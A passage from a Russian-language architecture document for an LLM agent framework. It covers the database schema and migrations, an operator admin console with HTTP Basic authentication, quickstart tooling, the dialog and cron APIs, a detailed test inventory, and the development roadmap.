  (str, index), `payload` (JSON), `created_at`; каскад удаления — явный DELETE в сторе
  (SQLite без PRAGMA foreign_keys)
- **cron_jobs** (таблица модуля `cron/`, см. выше): `id` (uuid str PK), `user_id`
  (str, index), `channel`, `title`, `schedule` (cron-выражение), `timezone` (IANA),
  `prompt`, `enabled` (bool), `next_fire_at`, `last_fire_at` (nullable), `claimed_by`
  (nullable), `claimed_at` (nullable), `created_at`; индекс (`enabled`, `next_fire_at`)
  для due-выборки; пара (`claimed_by`, `claimed_at`) — аренда планировщика (lease TTL)

Все `*_at` — timezone-aware UTC: `UTCDateTime` (`db/base.py`) принудительно выставляет UTC при
чтении/записи. Тип колонки при этом зависит от диалекта, контракт в Python — нет: на Postgres
это нативный `timestamptz` (asyncpg отвергает aware-значение, привязанное к `timestamp without
time zone`), на SQLite — naive-значение, нормализованное к UTC, и обратная простановка UTC при
чтении. Ветку выбирает `load_dialect_impl`.

Схема ведётся Alembic-миграциями
(`db/migrations/`, baseline автогенерён из ORM-метаданных): на старте composition root
вызывает `bootstrap_schema` — свежая или уже-управляемая БД мигрируется до head; БД, созданная
до Alembic (таблицы есть, `alembic_version` нет), штампуется на baseline и догоняется до head
(ALTER-миграции добавляют колонки условно — legacy-БД могла быть создана более новым
`create_all`). `init_db` (`create_all`)
остаётся для тестов и как fallback в composition root, если миграции не удалось применить.

**Два диалекта.** Прод работает на Postgres (`postgresql+asyncpg://`, драйвер — extra
`postgres` у `octoforge-core`), тесты и встраиваемый вариант — на SQLite. Историческую цепочку
миграций вне SQLite проиграть нельзя: три ревизии объявляют булевы колонки с
`server_default=sa.text('0')` (Postgres не принимает integer-дефолт для boolean), одна создаёт
частичный индекс только с `sqlite_where`, ещё одна строит индексы сырым SQL. Миграции
append-only (правки закоммиченных блокирует `PreToolUse`-хук), поэтому пустая не-SQLite база
получает актуальную схему через `Base.metadata.create_all` и штампуется на head
(`_create_and_stamp` в `db/engine.py`), а дальше идут обычные апгрейды — новые миграции обязаны
быть диалект-нейтральными. Частичный unique-индекс
`uq_instructions_public_type_title` объявляет предикат для обоих диалектов: без
`postgresql_where` Postgres собрал бы **полный** unique-индекс, и приватная запись
(включая память — она хранится в той же таблице) перестала бы шэдоуить публичную.
Диалект-чувствительные места покрыты `core/tests/test_postgres_stores.py` (гоняется по
`OF_TEST_DATABASE_URL`, без него скипается).

Нагрузочный аудит 28.07.2026 добавил `c9f2e4a7b381`: составной индекс
`(dialog_id, status)` на `exchanges` — без него `list_live`/`list_unowned_open`
сканировали бы весь обмен диалога (включая терминальные строки, они не
удаляются), а вызываются они на каждое сообщение и на каждой итерации петли
— и одиночный индекс `status` на `tasks`, за который держатся стартовые
свипы `list_orphaned`/`list_undelivered` над таблицей, которая по конструкции
никогда не чистится.

Перенос существующей SQLite-базы в Postgres — `tools/sqlite_to_postgres.py`: копирует таблицы в
FK-порядке через ORM-модели (чтобы `UTCDateTime` сам разобрался с таймзонами на каждой стороне),
инвайты отдельным проходом (свой `Base`, `create_all`), отказывается писать в непустую цель без
`--force` и сверяет счётчики по каждой таблице. Снимать снапшот источника нужно атомарно
(SQLite online backup, не `cp`), а писателей — останавливать: живой бот допишет строки между
копированием и сверкой.

Сервер живёт в compose (`postgres:18-alpine`, порт публикуется только на `127.0.0.1`), базы
разведены: `octoforge` — приложение, `octoforge_telegram` — инвайты (свой `Base`, без Alembic),
`octoforge_test` — тесты (фикстура дропает схему), `octoforge_dev` — локальный запуск. Три
последние создаёт init-скрипт `docker/postgres-init/`, потому что энтрипоинт образа создаёт
только `POSTGRES_DB`. Том монтируется на `/var/lib/postgresql`, а не на `.../data`: с 18-й
версии образ хранит кластер в подкаталоге с номером мажора и со старым монтированием не
стартует (docker-library/postgres#1259).

## Консоль оператора (`admin/` в ядре, `api/admin.py` в web)

Все остальные модули режут выборки по владельцу — это правило изоляции агентских поверхностей.
Оператору нужно обратное: все диалоги, все задачи, все записи. Поэтому read-model живёт в ядре
отдельным модулем `admin/` (граница — `api.py`: Protocol `AdminReadModel`, DTO `Page[T]`,
`DialogOverview`, `MessageRecord`, `Totals`; реализация — `store.py`, только SELECT'ы с
LIMIT/OFFSET и `count()`), а не в web-слое: иначе адаптеру пришлось бы тянуть SQLAlchemy, чего
он больше нигде не делает.

Мутации **не** идут через read-model. Пауза/удаление cron-задачи, удаление задачи и памяти,
публикация инструкции вызывают те же owner-scoped сервисы, что и агент (`CronStore.set_enabled`,
`TaskStore.delete`, `MemoryStore.delete`, `InstructionService.publish`), поэтому операторское
действие не может обойти инвариант, который соблюдает агент. Для публичных записей у агента
пути нет вовсе, поэтому у сервиса есть отдельная админская операция
`InstructionService.delete_public(id)`: удаляет публичную несистемную запись; приватный id для
неё «не найден» (приватное удаление остаётся owner-scoped), системная запись отвечает отказом —
ею владеет стартовая синхронизация реестра, которая всё равно воссоздала бы её при следующем
запуске. `DELETE /api/admin/instructions/{id}` без `owner_id` идёт по этому пути, с `owner_id` —
по owner-scoped.

Удаление диалога (`DELETE /api/admin/dialogs/{id}`) — композиция помодульных операций, а не
один SQL-каскад: сначала `ConversationManager.evict(user, channel)` останавливает и забывает
живой runner (иначе актор продолжил бы писать в исчезающие строки, а его нарратив пережил бы
свои строки), затем каждый модуль удаляет своё — `SummaryStore.delete_for_dialog`,
`TaskStore.delete_for_dialog`, `DialogRepository.delete` (сообщения + сам диалог одной
транзакцией). Cron-задачи переживают удаление: они принадлежат пользователю, а не диалогу, и
следующий fire просто создаст свежий диалог — как и следующее сообщение пользователя.

UI — одна статическая страница `/admin.html` (таблицы по сущностям, пагинация, переходы
диалог → сообщения и датасет → записи, просмотр длинных полей).

### Аутентификация

`web/auth.py`: HTTP Basic, одна операторская пара, пароль хранится как
`pbkdf2_sha256:iterations:salt:digest` (stdlib `hashlib.pbkdf2_hmac`, сравнение через
`hmac.compare_digest`; разделитель `:`, а не `$`, потому что docker compose интерполирует `$` в
`.env` и хэш приезжает в контейнер обрезанным). Гейт — middleware в `create_app`, а не
per-router зависимость: он должен покрывать и то, чего роутеры не видят, — статику, `/docs`,
`/openapi.json`. Открыты только `/health` и `/health/ready` (их дёргают healthcheck контейнера и
внешний мониторинг). Пустой `OF_ADMIN_PASSWORD_HASH` — это 503, а не «открыто»: fail closed.

Это не система пользователей. `X-User-Id` по-прежнему выбирает диалог; аутентифицируется
оператор, а не пользователи агента. До появления публичного домена гейта не было вовсе, и
доверенный `X-User-Id` означал бы, что любой желающий читает чужие диалоги.

## Первый запуск: quickstart, наследование эмбеддингов, отчёт о возможностях (2026-07-30)

Свежий клон до этого не запускался одной командой, и две ямы были не в документации, а в
поведении: пустой `OF_ADMIN_PASSWORD_HASH` — это 503 на всей HTTP-поверхности (fail closed,
см. «Аутентификация»), а дефолтный HTTP-бэкенд эмбеддингов без ключа — это **молча** выключенный
`recall`, то есть агент без скилов, знаний и датасетов. Обе закрыты.

- **`tools/quickstart.py`** генерирует `.env`: операторский пароль (печатается один раз, в файл
  идёт только хэш), Fernet-ключ секретного стора, LLM-эндпоинт (флаг → env → вопрос в TTY →
  плейсхолдер). Существующий `.env` никогда не перезаписывается — скрипт проверяет его и
  возвращает ненулевой код, если стартовать нечем (тогда `make quickstart` не идёт дальше).
  Скрипт **stdlib-only**: он работает до `make install` и вне venv, поэтому хэширование пароля
  дублирует `octoforge_web.auth.hash_password`; за идентичностью форматов следит
  `web/tests/test_quickstart.py`.
- **`docker-compose.local.yml`** — оверлей «попробовать локально»: свой `name:`
  (`octoforge-quickstart`, чтобы на хосте с прод-стеком из этого же чекаута не пересоздать
  боевой контейнер и не влезть в его том), свой тег образа (`octoforge:quickstart`), порт на
  `127.0.0.1`, порт postgres снят (`ports: !reset []` — иначе слияние *добавило* бы второй
  маппинг и 5432 столкнулся бы с уже работающим сервером), caddy уводится в профиль `tls`. Плюс
  build-arg `CORE_EXTRAS` в `Dockerfile` (дефолт `local-embeddings,postgres`) — локальный образ
  собирается без torch, минуты вместо десятков минут; поэтому там же принудительно
  `OF_EMBEDDING_BACKEND=openai`, иначе скопированный `.env` с `local` упал бы на ImportError.
  Telegram в локальном стеке — **opt-in** (`OF_TELEGRAM_BOT_TOKEN:
  ${OF_QUICKSTART_TELEGRAM_TOKEN:-}`): бота long-poll'ит ровно один процесс, и «попробовать» из
  чекаута, который обслуживает живого бота, иначе угоняет его апдейты (проверено на этом хосте).
- **Наследование эмбеддингов** (`Settings.embeddings_inherit_llm`): при HTTP-бэкенде, пустом
  `OF_EMBEDDING_API_KEY`, нетронутом `OF_EMBEDDING_BASE_URL` и заданном `OF_LLM_API_KEY`
  эмбеддинги едут на LLM-эндпоинт с его ключом (как уже сделано для vision). Условие узкое
  сознательно: фолбэк **монотонный** — он только включает то, что раньше было тихо выключено, и
  не может перенаправить установку, которая назвала свой эндпоинт. Модель по-прежнему за
  `OF_EMBEDDING_MODEL`.
- **Отчёт о возможностях** (`web/capabilities.py`, вызывается в начале `runtime()`, поэтому
  покрывает и standalone-Telegram): один блок в лог — каждая опциональная возможность on/off с
  эндпоинтом или моделью, которая её обеспечивает. Значения секретов не логируются (только хост
  и имя модели — тест это фиксирует). Два пробела дополнительно уходят WARNING'ом (`CRITICAL`):
  эмбеддинги и операторский пароль — без них установка либо бесполезна, либо недостижима.
- **Замер латентности** (`tools/bench_latency.py`, `make bench`): реальный стек (менеджер, актор,
  персист, LLM-роутер, петля) против скриптованного LLM с известным таймингом. Меряет накладные
  расходы фреймворка (submit → запрос к провайдеру), доставку дельты подписчику, конкурентное
  исполнение тулов (3×150 мс в одном сообщении ≈ один вызов) и параллельность обменов (2×400 мс
  ≈ один ответ). Числа лежат в README, в разделе «Why it feels fast» — при изменении поведения
  обновлять оба места.

## API (`octoforge_web/api/`)

Реализовано (диалог — get-or-create по (user_id, channel); канал `"web"` объявлен в composition root):

- все эндпоинты диалога требуют заголовок `X-User-Id` (доверенная строка до появления
  аутентификации); отсутствующий/пустой → 400
- `POST /api/dialog/messages` `{content, client_message_id?}` → 202 `{status: "accepted"}` —
  сообщение маршрутизируется в обмен: новый обмен (NEW), продолжение существующего
  (CONTINUE — живой прогон втянет его на следующем sync'е) или команда/отмены — по
  решению роутера. `client_message_id` — ключ идемпотентности: повтор с уже записанным ключом
  принимается, но пропускается (skip-if-seen в акторе + unique `(dialog_id,
  client_message_id)` на `messages`, миграция `8a1f3d5c2e97`); ретраи доставки не задваивают
  прогон. Telegram-адаптер использует chat-level `message_id` сообщения как ключ (Telegram
  шлёт update повторно, пока не получит 200; тот же id — цель реплая ответа)
- `POST /api/dialog/cancel` → 202 — останавливает все answer-прогоны диалога
  (явная просьба); RUN-задачи продолжаются
- `GET /api/dialog/events` — SSE-подписка на события диалога (`iteration_started`,
  `text_delta`, `assistant_message`, `tool_call_*`, `finished`, `cancelled`, `failed`,
  маркеры процессов `process_started`/`process_completed`;
  heartbeat-комментарии; в кадрах `seq`, `dialog_id` и `exchange_id` — клиент ведёт
  пузырь на обмен, конкурентные ответы стримятся параллельно); диалог создаётся при
  первом обращении, поэтому подписаться можно до первого сообщения
- `GET /health` — liveness (`{status: ok}`); `GET /health/ready` — readiness: проверяет
  `SELECT 1` к БД, при недоступности возвращает 503 `{status: not-ready}`
- `GET /` — чат-UI (SSE-стрим токенов в пузырь своего обмена, шаги тулов, серая
  курсивная строка-маркер о старте/завершении процессов, «Стоп», поле имени =
  user_id, уходит заголовком `X-User-Id`; EventSource не умеет кастомные заголовки, поэтому
  стрим читается через fetch)
- крон-задачи (`/api/cron`, скоуп по `X-User-Id`, параметры — query string):
  `POST /api/cron/jobs?title=&schedule=&prompt=&timezone=` → 201 + JSON задачи
  (невалидные cron-выражение/таймзона → 422; `next_fire_at` вычисляется от now);
  `GET /api/cron/jobs` → список задач юзера; `DELETE /api/cron/jobs/{id}` → 204
  (чужая/несуществующая → 404); `POST /api/cron/jobs/{id}/pause` → enabled=false;
  `POST /api/cron/jobs/{id}/resume` → enabled=true с `next_fire_at` от now

План:

- аутентификация: `users`, токены (`POST /api/users` с admin-secret, `Authorization: Bearer`),
  служебные токены для wake/cron
- `GET /api/skills`, `GET /api/tasks`
- `GET /ws` — при необходимости двунаправленного канала

## Тесты (pytest + pytest-asyncio)

Реализовано:

- `core/tests/test_openai_stream.py` — SSE-парсинг (дельты, склейка tool_calls, [DONE]), `aclose`
- `core/tests/test_openai_client.py` — non-streaming вызов, tools, tool-история, ошибки
- `core/tests/test_agent_loop.py` — события прогона, eager-исполнение тулов, отмена с частичным текстом, ошибка тула, лимит итераций, idle-timeout стрима
- `core/tests/test_conversation_runner.py` — обмены и процессы: submit → стрим +
  ProcessCompleted, финал в нарратив; два вопроса → два конкурентных answer-прогона,
  каждый стримит в свой обмен (`exchange_id` в ConversationEvent); CONTINUE-сообщение
  подтягивается работающим прогоном на следующей итерации (pull); сообщение,
  пришедшее после последнего sync'а, возвращает обмен в OPEN и получает свежий
  прогон; ask_user: вопрос доставляется немедленно, обмен — AWAITING_USER, реплика
  возобновляет его новым прогоном; «верни задачу X» → новый answer-прогон;
  CANCEL обменов по решению роутера (точечно, чужой стрим не задет);
  cancel() останавливает answer-прогоны, но не RUN-задачи; лимит → шаблонное
  уведомление брокера без LLM-прогона (и на spawn, и конкурентно); пустой финал —
  молчание без пустого пузыря; task_create через тул → bg-процесс → доставка
  результата немедленно, даже mid-stream чужого ответа; delete_task останавливает
  живой bg-процесс (самоудаление отклоняется); реплай-ключи в
  ProcessStarted/Finished; упавший answer не задевает соседний стрим; отмена уносит
  втянутые уточнения; гигиена прерванного тёрна (текст и tool-хвост); пересборка
  нарратива после «перезапуска» менеджера; wake крон-задачи → bg-процесс с
  `cron_job_id` в `Task.input`, DONE и FAILED — отдельными сообщениями; recovery:
  перезапуск orphaned RUN- и ANSWER-задач (обмен переприсваивается новому прогону),
  редоставка недоставленных, идемпотентность по `delivered_at`, без подписчика
  outbox ждёт; реактивная компакция при переполнении контекста (ретрай один раз);
  супервизия актора (сбойная команда не зомбирует диалог, слот освобождается при
  сбое финализации) (SQLite :memory:; роутер — детерминированный fake, не LLM)
- `core/tests/test_router.py` — LLMRouter на mock LLMClient: нет живых обменов →
  NEW без вызова LLM; CONTINUE в известный обмен; CONTINUE в неизвестный /
  неизвестный action → деградация к NEW с сохранением `cancel_ids`; COMMAND ничего
  не отвечает; фолбэки на NEW (нет tool_call, ошибка, таймаут); промпт описывает
  обмены человеческими строками (статус, pending-вопрос, возраст); роутерный промпт
  из провайдера
- `core/tests/test_db_repositories.py` — диалоги (get-or-create, уникальность пары), сообщения
  (seq/порядок, tool_calls round-trip, изоляция), UTCDateTime round-trip, SqlAlchemyTaskStore
  (те же сценарии, что у InMemoryTaskStore: add/get/list/mark_done/mark_failed/mark_cancelled/
  delete, list_orphaned, list_undelivered, mark_delivered)
- `core/tests/test_tasks.py` — task_create (немедленный путь через fake-спавнер: делегация,
  отказ текстом, отсутствие спавнера — ToolArgumentsError; schedule-путь: создание
  крон-задачи, дедуп, timezone UTC по умолчанию, one_shot без schedule — ошибка),
  task_list (две секции; answer-задачи и доставленные терминальные скрыты),
  task_delete (терминальная строка остаётся, активная — через fake-deleter,
  самоудаление — отказ, крон-поглощение, чужой диалог), InMemoryTaskStore: delete,
  list_orphaned, list_undelivered, mark_delivered, UTC-даты
- `core/tests/test_http_request_tool.py`, `core/tests/test_tools_registry.py`
- `core/tests/test_instructions_local.py` — контрактный набор фасада на `:memory:` (save/upsert
  с бампом версии и пересчётом эмбеддинга, get_by_name с сужением по типу, ранжирование:
  ближний вектор, буст точного title, k, инкремент usage_count, сидирование один раз;
  сид крон-тулов: записи указывают на self base URL, идемпотентность, независимость от
  weather-маркера); сервис строится фабрикой-фикстурой — тот же набор позже прогонит
  http-реализацию
- `core/tests/test_embeddings.py` — клиент эмбеддингов поверх мокнутого httpx-транспорта
  (форма запроса, разбор ответа с переупорядочиванием по index, ошибки статуса и payload)
- `core/tests/test_external_call.py` — парсинг/валидация ToolSpec, рендер шаблона с quoting,
  валидация параметров, whitelist-заголовок только для своего префикса, блок SSRF,
  редирект не следуется, обрезка тела; темплейт `{user_id}` в значении заголовка
  (подстановка, отсутствие user_id → без заголовка, статичное значение неизменно),
  allowlist-префикс пропускает loopback, тул передаёт `context.user_id`
- `core/tests/test_ssrf_guard.py` — stub-resolver: private/loopback/link-local/multicast/CGNAT/
  IPv6 заблокированы, публичные разрешены, любой приватный из многих блокирует, неразрешимый
  хост и не-http(s) URL заблокированы; allowed_prefixes — пропуск без resolve, остальные
  URL проверяются по-прежнему
- `core/tests/test_cron_store.py` — SQL-стор крона на `:memory:`: CRUD, изоляция юзеров
  (delete/set_enabled чужого → CronJobNotFoundError), list_due (enabled, окно, свежая и
  протухшая аренда, порядок, лимит), claim CAS (гонка, сдвинутый next_fire_at, перехват
  протухшей аренды), release_claim, complete_fire, record_fire_result (retry_at →
  сдвиг next_fire_at + инкремент серии, без ретрая → сброс)
- `core/tests/test_cron_scheduler.py` — реальный стор + записывающий fake-waker: выстрел
  due с пересчётом next_fire_at в будущее, будущая/disabled не стреляют, coalesce
  пропущенных с суффиксом, лимит реплея (остаток ждёт следующий тик), failed wake →
  release_claim, чужая свежая аренда → пропуск; compute_next_fire по таймзоне
  (Europe/Moscow 9:00 = 06:00 UTC), невалидные schedule/timezone → CronScheduleError,
  count_missed (минус текущий выстрел, cap); порт Scheduler (соответствие и подмена)
- `core/tests/test_cron_reporter.py` — политика исходов: DONE фиксируется без сдвига
  расписания, DONE удаляет one-shot задачу, FAILED — без ретрая (запись last_error),
  FAILED удаляет one-shot, CANCELLED оставляет one-shot, удалённая/непомеченная
  задача — тихо, обрезка ошибки до 500
- `core/tests/test_cron_tools.py` — тулы `cron_pause`/`cron_resume` (owner-изоляция,
  resume пересчитывает `next_fire_at` от now)
- `core/tests/test_instruction_tools.py` — адаптеры `recall`/`instruction_save`/
  `instruction_delete`/`external_call` (валидация аргументов + happy path на фейках)
- `core/tests/test_datasets.py` — контрактный набор фасада DatasetService на `:memory:`
  (create/get, дубликат имени, одно имя у разных owner'ов, изоляция, query: equals с
  тип-чувствительностью/диапазон дат/limit, delete каскадом со счётчиком, search с
  ранжированием и бустом точного имени); сервис строится фабрикой-фикстурой, как у instructions
- `core/tests/test_dataset_validation.py` — `parse_schema` (ок/ошибки, round-trip с
  `dump_schema`) и `validate_record` (все типы, required, bool ≠ int/number, лишние поля)
- `core/tests/test_data_tools.py` — `data_put` (создание со schema+description, отказ без
  них, запись в существующий, нарушения схемы текстом), `data_query` (JSON-строки, фильтры,
  лимиты, date-only границы, not-found текстом), `data_forget` (счётчик, not-found),
  `recall` с datasets (merged-выдача с `[dataset]`)
- `core/tests/test_memory_tools.py` — `memory_store`/`memory_delete` поверх стора
  инструкций (upsert по ключу, видимость через recall и фильтр type=memory,
  изоляция владельцев, недосягаемость легаси-глобальных записей, ошибки аргументов)
- `core/tests/test_instructions_store_port.py`, `core/tests/test_datasets_store_port.py` —
  подмена store-портов (P1 модульности): in-memory `InstructionStore`/`DatasetStore`
  инъектируются в немодифицированные сервисы (save/search/get/delete без SQL), vector-capable
  fake получает `search_by_vector` (делегирование, owner в сигнатуре, буст поверх кандидатов)
- `core/tests/test_composition.py` — переиспользуемые builder'ы (P5 модульности): полный
  набор базовых тулов из `build_tool_registry` (без `web_search` при `search_provider=None`),
  подмена портов через builder'ы (fake `SearchProvider`, in-memory `InstructionStore`),
  рабочий `build_conversation_manager` на SQLite `:memory:` с прогоном диалога
- `core/tests/test_prompts.py` — `StaticPromptProvider`: вшитые дефолты, кастомный маппинг,
  KeyError на неизвестное имя; `test_router.py` += роутерный промпт из провайдера
- `core/tests/test_web_search_tool.py` — тул над fake-`SearchProvider` (подмена P3):
  форматирование answer box и позиций, клэмп num_results до провайдера, «no results»,
  SearchError → текст ошибки, срез длинного вывода
- `core/tests/test_serper_provider.py` — `SerperSearchProvider` на мокнутом httpx: заголовок
  ключа и тело запроса, парсинг answerBox/organic (cap по num), HTTP-ошибка и сетевой сбой
  → `SearchError`
- `web/tests/test_config.py` — Settings: дефолты OF_EMBEDDING_*/top-k/whitelist/лимитов
  data_query, max_processes и router_timeout_seconds (дефолты и env),
  self_base_url и OF_CRON_* (дефолты и env), парсинг JSON-whitelist и лимитов из env,
  OF_*_PROMPT_SOURCE (file:-источники, неизвестная схема → ValueError)
- `web/tests/test_prompts.py` — `FilePromptProvider`: чтение из файла, перечитывание на
  каждый get(), fallback на StaticPromptProvider (нет файла/файл нечитаем + warning),
  KeyError на неизвестное имя
- `web/tests/test_modularity.py` — приёмочный сценарий модульности: минимальный сторонний
  composition root (без `main.runtime()`), собранный из core-builder'ов
  (`octoforge_core.composition`): системный+роутерный промпты из файлов,
  fake-`SearchProvider`, in-memory `InstructionStore` — диалог прогоняется целиком
  (промпты доезжают до LLM, тулы выполняются над подменёнными компонентами)
- `web/tests/test_dialog_api.py` — get-or-create диалога, изоляция двух user_id, 400 без
  `X-User-Id`, messages/cancel/events (SSE через генератор), health, UI
- `web/tests/test_cron_api.py` — create (201 + поля, next_fire_at в будущем, default UTC),
  невалидные schedule/timezone/пропущенный параметр → 422, list с изоляцией двух юзеров,
  delete 204/404 (чужая и несуществующая), pause/resume (resume пересчитывает
  next_fire_at; чужие → 404), 400 без `X-User-Id` на всех эндпоинтах
- `web/tests/test_sse.py` — сериализация событий в SSE-кадры (включая маркеры процессов)
- `web/tests/test_telegram_models.py` — парсинг update'ов Bot API (лишние поля игнорируются,
  алиас `from`, неизвестный тип чата отклоняется)
- `web/tests/test_telegram_bridge.py` — мост на реальном manager'е (ScriptedLLM) + fake
  TelegramClient: дельты → одно редактируемое сообщение, статус-строки тулов перед ответом,
  чанкинг >4096 (seal и продолжение), отмена и ошибка LLM — строками в черновике; чанкер
  `split_message` (границы строки/слова, жёсткий рез)
- `web/tests/test_telegram_poller.py` — команды `/start`/`/cancel`, уведомления группе и
  не-тексту, текст → диалог → ответ, offset-продвижение и backlog-drain при старте,
  восстановление после ошибок поллинга, `chat_id_from_user_id`, прогрев мостов (только
  tg-префиксованные user_id)

План:

- `test_skills_engine.py`, auth-тесты

## Порядок работ

> Детальная дорожная карта по этапам A–F (БД → инструкции → датасеты → память →
> роутер → крон), включая решение отложить аутентификацию (user_id — доверенная
> строка от клиента), — в [plan.md](plan.md).

1. ✅ Скаффолд монорепо: библиотека `core/` + приложение `web/`, Makefile, ruff/mypy/pytest
2. ✅ Чат без аутентификации: UI, `POST /api/chat`, ядро — прокси к LLM
3. ✅ Петля + базовые тулы: `AgentLoop` (tool calling), `Tool/ToolSpec/ToolRegistry`, `http_request`
4. ✅ Событийная петля + актор диалога + фоновые задачи (in-memory): стриминг токенов (SSE), отмена, `task_create`/`task_list`/`task_delete`, проактивные уведомления, системный промпт answer-first
5. ✅ (без аутентификации: user_id — доверенная строка от клиента; users/токены отложены) БД (SQLAlchemy async, SQLite), перенос историй/задач в БД; диалоги keyed by (user, channel), поверхности — см. [dialogs.md](dialogs.md); две инсталляции (standalone/distributed) — см. [scaling.md](scaling.md)
6. Динамические скилы: Jinja-движок + `skill.save/run`; тулы памяти (user/global) ✅ (этап D)
7. Агентный контекст: память в контексте (автоинъекция), `GET /api/skills`, `GET /api/tasks`
8. ✅ LLM-роутер и модель обменов диалога (этап E; процессная модель 2026-07-28 заменена обменами) — см. [exchanges.md](exchanges.md)
9. Инструкции в БД (знание/скил/тул + векторный поиск, этап B ✅) — см. [instructions.md](instructions.md); датасеты пользовательских данных (этап C ✅) — см. [data-store.md](data-store.md); крон-задачи (этап F ✅) — см. [cron.md](cron.md)
10. Бэклог из обзора openclaw (SSRF-гвард, формула поиска, каталог скилов, детали крона и пр.) — см. [openclaw-review.md](openclaw-review.md)
11. ✅ Telegram-адаптер (этап G): вторая поверхность (канал "telegram", user_id = tg:<id>), long-poll на httpx, мосты с throttle-правками, прогрев из БД — см. «Telegram-адаптер (этап G)» выше

## Проверка

- `make check` (ruff → mypy → pytest) — всё зелёное
- Ручной сценарий: `make run` → http://127.0.0.1:8000 → токены текут по мере генерации; «выполни GET к <url>» — шаг тула виден в чате; «реши в фоне X» — агент подтверждает и продолжает диалог, результат приходит сам; «Стоп» — ответ обрывается; два разных имени — истории и задачи изолированы; перезапуск приложения не теряет диалог (история восстанавливается из БД)
- Целевой сценарий: два юзера → память не смешивается, скил общий, задачи разных юзеров изолированы
